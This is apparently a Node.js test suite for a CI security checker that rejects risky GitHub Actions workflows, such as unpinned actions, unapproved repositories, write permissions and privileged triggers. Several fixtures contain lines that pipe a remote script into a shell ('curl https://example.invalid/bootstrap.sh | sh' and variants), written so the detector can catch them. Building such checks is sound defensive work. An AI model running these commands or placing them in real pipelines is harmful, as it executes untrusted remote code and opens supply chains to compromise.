import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import {
  BOOTSTRAP_ACTION_PINS,
  BOOTSTRAP_BASE_SHA,
  resolveActionPins,
  validateCiWorkflowContract,
  validateWorkflowText,
} from "../../scripts/check-workflows.mjs";

const root = new URL("../../", import.meta.url);

test("E7 approved workflow Actions use immutable manifest entries", async () => {
  const workflow = await readFile(new URL(".github/workflows/ci.yml", root), "utf8");
  const pins = JSON.parse(await readFile(new URL("workflow/action-pins.json", root), "utf8"));
  const errors = validateWorkflowText(workflow, pins, ".github/workflows/ci.yml");
  assert.deepEqual(errors, []);
});

test("E7 rejects tags, unapproved repositories, bootstrap commands, and writable jobs", () => {
  const pins = { actions: { "actions/checkout": { sha: "a".repeat(40), version: "v4.2.2", type: "action" } } };
  const bad = [
    "name: bad",
    "on: pull_request",
    "permissions: {}",
    "jobs:",
    "  build:",
    "    permissions: { contents: write }",
    "    steps:",
    "      - uses: actions/checkout@v4",
    "      - uses: evil/example@" + "b".repeat(40),
    "      - run: curl https://example.invalid/bootstrap.sh | sh",
  ].join("\n");
  const errors = validateWorkflowText(bad, pins, "fixture.yml");
  assert.match(errors.join("\n"), /full commit SHA/);
  assert.match(errors.join("\n"), /approved repository/);
  assert.match(errors.join("\n"), /remote bootstrap/);
  assert.match(errors.join("\n"), /write permissions/);
});

test("E7 rejects path-qualified and env-wrapped remote shells", () => {
  for (const shell of ["/bin/bash", "env bash", "command bash", "exec bash", "/usr/bin/env bash", "busybox sh"]) {
    const workflow = [
      "name: remote-shell",
      "on: pull_request",
      "jobs:",
      "  build:",
      "    steps:",
      `      - run: curl https://example.invalid/bootstrap.sh | ${shell}`,
    ].join("\n");
    const errors = validateWorkflowText(workflow, { actions: {} }, "remote-shell.yml");
    assert.match(errors.join("\n"), /remote bootstrap/);
  }
});

test("E7 rejects unapproved local workflow Actions", () => {
  const workflow = [
    "name: local-action",
    "on: pull_request",
    "jobs:",
    "  build:",
    "    steps:",
    "      - uses: ./untrusted-action",
  ].join("\n");
  assert.match(validateWorkflowText(workflow, { actions: {} }, "local-action.yml").join("\n"), /local.*Action/i);
});

test("E7 rejects remote bootstrap pipes continued across escaped lines", () => {
  const workflow = [
    "name: multiline-remote-shell",
    "on: pull_request",
    "jobs:",
    "  build:",
    "    steps:",
    "      - run: |",
    "          curl https://example.invalid/bootstrap.sh \\",
    "            | bash",
  ].join("\n");
  assert.match(validateWorkflowText(workflow, { actions: {} }, "multiline-remote-shell.yml").join("\n"), /remote bootstrap/);
});

test("F11 rejects privileged workflow triggers, runners, and environments", () => {
  const bad = [
    "on:",
    "  pull_request_target:",
    "jobs:",
    "  release:",
    "    runs-on:",
    "      - self-hosted",
    "    environment: production",
  ].join("\n");
  const errors = validateWorkflowText(bad, { actions: {} }, "fixture.yml");
  assert.match(errors.join("\n"), /pull_request_target/);
  assert.match(errors.join("\n"), /self-hosted/);
  assert.match(errors.join("\n"), /environment/);
});

test("F11 rejects deployment and non-pull-request triggers", () => {
  const bad = [
    "on:",
    "  push:",
    "  deployment:",
  ].join("\n");
  const errors = validateWorkflowText(bad, { actions: {} }, "fixture.yml");
  assert.match(errors.join("\n"), /pull_request trigger/);
  assert.match(errors.join("\n"), /deployment trigger/);
});

test("E7 bootstrap uses fixed Action pins when the trusted base has no manifest", () => {
  assert.deepEqual(resolveActionPins({
    baseManifest: null,
    baseSha: BOOTSTRAP_BASE_SHA,
    baseBranch: "development",
    prNumber: "42",
    bootstrapPrNumber: "42",
  }), BOOTSTRAP_ACTION_PINS);
  assert.throws(() => resolveActionPins({
    baseManifest: null,
    baseSha: BOOTSTRAP_BASE_SHA,
    baseBranch: "main",
    prNumber: "42",
    bootstrapPrNumber: "42",
  }), /bootstrap requires the development target/);
  assert.throws(() => resolveActionPins({
    baseManifest: null,
    baseSha: "c".repeat(40),
    baseBranch: "development",
    prNumber: "42",
    bootstrapPrNumber: "42",
  }), /base Action manifest is required after bootstrap/);
});

test("N2 rejects scalar and inline writable permission declarations", () => {
  const bad = [
    "permissions: write-all",
    "jobs:",
    "  deploy:",
    "    permissions: { contents: write }",
  ].join("\n");
  const errors = validateWorkflowText(bad, { actions: {} }, "fixture.yml");
  assert.match(errors.join("\n"), /write permissions/);
});

test("F7/F11 parse YAML structure instead of trusting quoted keys or block scalars", () => {
  const quotedKeys = [
    "name: bypass",
    "on:",
    "  pull_request:",
    "permissions:",
    "  \"contents\": write",
    "jobs:",
    "  build:",
    "    runs-on: ubuntu-24.04",
    "    steps:",
    "      - \"uses\": evil/example@v4",
  ].join("\n");
  const blockScalarTrigger = [
    "name: bypass",
    "jobs:",
    "  build:",
    "    steps:",
    "      - run: |",
    "          on:",
    "            pull_request:",
    "on: push",
  ].join("\n");

  const quotedErrors = validateWorkflowText(quotedKeys, { actions: {} }, "quoted.yml");
  const scalarErrors = validateWorkflowText(blockScalarTrigger, { actions: {} }, "scalar.yml");
  assert.match(quotedErrors.join("\n"), /write permissions/);
  assert.match(quotedErrors.join("\n"), /full commit SHA/);
  assert.match(quotedErrors.join("\n"), /approved repository/);
  assert.match(scalarErrors.join("\n"), /pull_request trigger/);
});

test("F7 validates reusable workflow references as Actions", () => {
  const workflow = [
    "name: reusable",
    "on: pull_request",
    "jobs:",
    "  build:",
    "    uses: evil/example/.github/workflows/build.yml@v1",
  ].join("\n");
  const errors = validateWorkflowText(workflow, { actions: {} }, "reusable.yml");
  assert.match(errors.join("\n"), /full commit SHA/);
  assert.match(errors.join("\n"), /approved repository/);
});

test("F1 workflow topology requires all checks and security steps", () => {
  const incomplete = [
    "name: CI",
    "on:",
    "  pull_request:",
    "jobs:",
    "  workspace:",
    "    steps:",
    "      - run: npm test",
    "  typecheck:",
    "    steps:",
    "      - run: npm run typecheck",
    "  lint:",
    "    steps:",
    "      - run: npm run lint",
    "  contract:",
    "    steps:",
    "      - run: npm run contract",
    "  dependency-audit:",
    "    steps:",
    "      - run: npm run audit:dependencies",
    "  secret-scan:",
    "    steps:",
    "      - run: npm run scan:secrets",
    "  workflow-security:",
    "    steps:",
    "      - run: npm run check:workflows",
  ].join("\n");
  const errors = validateCiWorkflowContract(incomplete, "ci.yml");
  assert.match(errors.join("\n"), /check:agent-policy/);
  assert.match(errors.join("\n"), /check:security-review/);

  const spoofed = incomplete.replace("npm test", "echo npm test");
  assert.match(validateCiWorkflowContract(spoofed, "ci.yml").join("\n"), /job workspace must run npm test/);
});

test("E6 dependency-audit remains the exact high-severity npm command", async () => {
  const manifest = JSON.parse(await readFile(new URL("package.json", root), "utf8"));
  assert.equal(manifest.scripts?.["audit:dependencies"], "npm audit --audit-level=high");
});
